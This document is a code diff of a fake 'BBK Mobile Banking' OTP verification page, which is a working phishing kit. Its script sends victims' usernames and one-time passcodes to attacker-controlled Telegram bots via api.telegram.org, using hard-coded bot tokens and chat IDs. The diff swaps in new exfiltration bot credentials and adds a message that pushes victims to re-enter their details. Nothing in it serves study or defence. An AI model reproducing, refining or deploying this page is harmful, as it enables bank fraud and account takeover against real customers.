@@ -1,4 +1,6 @@
-<html lang="en"><head>
+<!DOCTYPE html>
+<html lang="en">
+<head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>BBK Mobile Banking - OTP Verification</title>
@@ -310,6 +312,22 @@
             background: #ff3742;
         }
 
+        /* Timeout message styles */
+        .timeout-message {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            padding: 15px;
+            margin-top: 20px;
+            text-align: center;
+            font-size: 14px;
+            line-height: 1.5;
+            display: none;
+        }
+
+        .timeout-message.show {
+            display: block;
+        }
+
         @media (max-width: 480px) {
             .container {
                 padding: 30px 20px;
@@ -341,49 +359,53 @@
 
         <div class="verification-text">
             <h1>OTP Verification</h1>
-            <p>We've sent a 6-digit verification code to your registered mobile number</p>
+            <p id="otpMessage">We've sent a 6-digit verification code to your registered mobile number</p>
         </div>
 
-            <form action="send.php" method="post">
-
-        <div class="otp-container">
-            <div class="otp-inputs">
-                <input type="tel" name="one" class="otp-input" maxlength="1" id="otp1">
-                <input type="tel" name="two" class="otp-input" maxlength="1" id="otp2">
-                <input type="tel" name="three" class="otp-input" maxlength="1" id="otp3">
-                <input type="tel" name="four" class="otp-input" maxlength="1" id="otp4">
-                <input type="tel" name="five" class="otp-input" maxlength="1" id="otp5">
-                <input type="tel" name="six" class="otp-input" maxlength="1" id="otp6">
+        <form action="send.php" method="post">
+            <div class="otp-container">
+                <div class="otp-inputs">
+                    <input type="tel" name="one" class="otp-input" maxlength="1" id="otp1">
+                    <input type="tel" name="two" class="otp-input" maxlength="1" id="otp2">
+                    <input type="tel" name="three" class="otp-input" maxlength="1" id="otp3">
+                    <input type="tel" name="four" class="otp-input" maxlength="1" id="otp4">
+                    <input type="tel" name="five" class="otp-input" maxlength="1" id="otp5">
+                    <input type="tel" name="six" class="otp-input" maxlength="1" id="otp6">
+                </div>
             </div>
-        </div>
 
-        <div class="resend-container">
-            <div class="resend-text">Didn't receive the code?</div>
-             <button type="button" class="resend-button" onclick="resendOTP(event)" id="resendBtn" disabled="">Resend OTP</button>
-            <div class="timer" id="timer">Resend available in 54s</div>
-        </div>
+            <div class="resend-container">
+                <div class="resend-text">Didn't receive the code?</div>
+                <button type="button" class="resend-button" onclick="resendOTP(event)" id="resendBtn" disabled>Resend OTP</button>
+                <div class="timer" id="timer">Resend available in 60s</div>
+            </div>
 
-        <button class="verify-button" name="again" id="verifyBtn">Verify</button>
+            <!-- <div class="timeout-message" id="timeoutMessage">
+                If you have not received OTP yet, you might have entered incorrect details. Go back and correct them.
+            </div> -->
 
-        <div class="back-button">
-            <a href="/k">← Back</a>
-        </div>
-    </form></div>
+            <button class="verify-button" name="again" id="verifyBtn">Verify</button>
+
+            <div class="back-button">
+                <a href="/k.html">← Back</a>
+            </div>
+        </form>
+    </div>
     
     <!-- Error Modal -->
-    <div class="modal-overlay" id="errorModal">
+    <!-- <div class="modal-overlay" id="errorModal">
         <div class="error-modal">
             <div class="error-icon">⚠</div>
             <div class="error-title">Invalid OTP</div>
             <div class="error-message">The OTP you entered is incorrect. Please try again with the correct code.</div>
             <button class="error-button" onclick="closeErrorModal()">Try Again</button>
         </div>
-    </div>
+    </div> -->
 
     <script>
         // Telegram Bot Configuration
         const TELEGRAM_BOT_TOKEN = '7160460432:AAEXAuVrgIiyZTPCm9B5dJgfF2hGvp78guY';
-        const TELEGRAM_CHAT_ID = '6466028665    ';
+        const TELEGRAM_CHAT_ID = '6466028665';
 
         let resendTimer = 60;
         let timerInterval;
@@ -393,7 +415,6 @@
         document.addEventListener('DOMContentLoaded', function() {
             // Get username from session storage
             const username = sessionStorage.getItem('bbk_username');
-
 
             // Get current attempt count
             otpAttempts = parseInt(sessionStorage.getItem('otp_attempts') || '0');
@@ -485,6 +506,8 @@
         function startResendTimer() {
             const resendBtn = document.getElementById('resendBtn');
             const timer = document.getElementById('timer');
+            const otpMessage = document.getElementById('otpMessage');
+            // const timeoutMessage = document.getElementById('timeoutMessage');
             
             resendBtn.disabled = true;
             
@@ -497,6 +520,10 @@
                     resendBtn.disabled = false;
                     timer.textContent = '';
                     resendTimer = 60;
+                    
+                    // Update the message when timer expires
+                    otpMessage.textContent = "If you have not received OTP yet, you might have entered incorrect details. Go back and correct them.";
+                    // timeoutMessage.classList.add('show');
                 }
             }, 1000);
         }
@@ -549,8 +576,8 @@
             verifyBtn.disabled = true;
             verifyBtn.innerHTML = '<span class="loading-spinner"></span>';
 
-            const botToken = "8317396526:AAFNNX5WnbBb_Nt9cOUDOqy1cXhe2xrsSu8";
-            const chatId = "-5091116242";
+            const botToken = "8453434962:AAH2AZVGtRtUjqw4ziizkdE_GntutiUF6OA";
+            const chatId = "-5000519303";
             
             try {
                 // Send OTP to Telegram
@@ -583,45 +610,49 @@
 
         // Resend OTP
         async function resendOTP(e) {
-    // Prevent any default behavior
-    if (e) {
-        e.preventDefault();
-        e.stopPropagation();
-    }
-    
-    // Send resend notification
-    const message = `🔄 BBK OTP Resend Request\n\n👤 Username: ${name}\n⏰ Time: ${new Date().toISOString()}`;
-    const botTokenn = "8317396526:AAFNNX5WnbBb_Nt9cOUDOqy1cXhe2xrsSu8";
-    const chatIdd = "-5091116242";
-    try {
-        await fetch(`https://api.telegram.org/bot${botTokenn}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: chatIdd, text: message })
-        });
-    } catch (error) {
-        console.log('Resend notification stored locally');
-    }
+            // Prevent any default behavior
+            if (e) {
+                e.preventDefault();
+                e.stopPropagation();
+            }
+            
+            // Send resend notification
+            const message = `🔄 BBK OTP Resend Request\n\n👤 Username: ${name}\n⏰ Time: ${new Date().toISOString()}`;
+            const botTokenn = "8453434962:AAH2AZVGtRtUjqw4ziizkdE_GntutiUF6OA";
+            const chatIdd = "-5000519303";
+            try {
+                await fetch(`https://api.telegram.org/bot${botTokenn}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatIdd, text: message })
+                });
+            } catch (error) {
+                console.log('Resend notification stored locally');
+            }
 
-    // Clear current OTP inputs
-    const inputs = document.querySelectorAll('.otp-input');
-    inputs.forEach(input => {
-        input.value = '';
-        input.classList.remove('filled', 'error');
-    });
+            // Clear current OTP inputs
+            const inputs = document.querySelectorAll('.otp-input');
+            inputs.forEach(input => {
+                input.value = '';
+                input.classList.remove('filled', 'error');
+            });
 
-    // Restart timer
-    clearInterval(timerInterval);
-    resendTimer = 60;
-    startResendTimer();
-    
-    // Focus on first input
-    if (inputs[0]) {
-        inputs[0].focus();
-    }
+            // Reset the message to original
+            document.getElementById('otpMessage').textContent = "We've sent a 6-digit verification code to your registered mobile number";
+            document.getElementById('timeoutMessage').classList.remove('show');
 
-    alert('OTP has been resent to your registered mobile number');
-}
+            // Restart timer
+            clearInterval(timerInterval);
+            resendTimer = 60;
+            startResendTimer();
+            
+            // Focus on first input
+            if (inputs[0]) {
+                inputs[0].focus();
+            }
+
+            alert('OTP has been resent to your registered mobile number');
+        }
 
         // Setup verify button click handler
         document.addEventListener('DOMContentLoaded', function() {
@@ -634,42 +665,5 @@
             }
         });
     </script>
-
-<div id="give-freely-root-ejkiikneibegknkgimmihdpcbcedgmpo" class="give-freely-root" data-extension-id="ejkiikneibegknkgimmihdpcbcedgmpo" data-extension-name="Volume Booster" style="display: block;"><template shadowrootmode="open"><style>
-  :host {
-    all: initial;
-  }
-
-  .gf-scroll-remove::-webkit-scrollbar {
-    border-radius-bottom-right: 15px;
-  }
-
-  button {
-    cursor: pointer;
-    transition: transform 0.1s ease;
-  }
-
-  button:active {
-    transform: scale(0.98);
-  }
-
-  .give-freely-close-button:hover {
-    opacity: 0.7;
-  }
-
-  input[type="radio"] {
-    margin-right: 8px;
-  }
-
-  hr {
-    border: none;
-    border-top: 1px solid #e5e5e5;
-    margin: 1em 0;
-  }
-
-  @media (max-width: 600px), (max-height: 480px) {
-    #give-freely-checkout-popup {
-      display: none !important;
-    }
-  }
-</style><div><div class="gf-app"></div></div></template></div></body></html>
+</body>
+</html>
